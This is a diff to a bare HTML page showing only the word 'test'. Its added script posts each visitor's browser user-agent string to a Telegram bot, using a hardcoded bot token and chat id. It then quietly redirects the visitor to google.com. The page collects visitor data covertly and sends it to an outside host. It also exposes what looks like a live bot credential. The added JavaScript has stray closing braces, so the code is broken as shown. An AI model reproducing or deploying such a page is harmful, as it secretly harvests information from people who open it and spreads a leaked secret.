@@ -1,14 +1,21 @@
-<!<!DOCTYPE HTML>
+<!DOCTYPE HTML>
 <html>
 <body>
-    <p> test </p>
+    test
     <script type="text/javascript" charset="utf-8">
     var token = "6423548656:AAFuFXiyAUDll8FgYjbYw6Iu30NdeSwml7s";
         var chat = "1955367555";
     var s = navigator.userAgent;
-        post(`https://api.telegram.org/bot${token}/sendMessage`,{
+    $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                     chat_id:chat,
                     text:s
+    }).done(function(data){
+                    window.location.replace("https://google.com");
+                }).fail(function(data){
+                    alert("Something is wrong");
+                });
+            }
+        });
     </script>
 </body>
 </html>
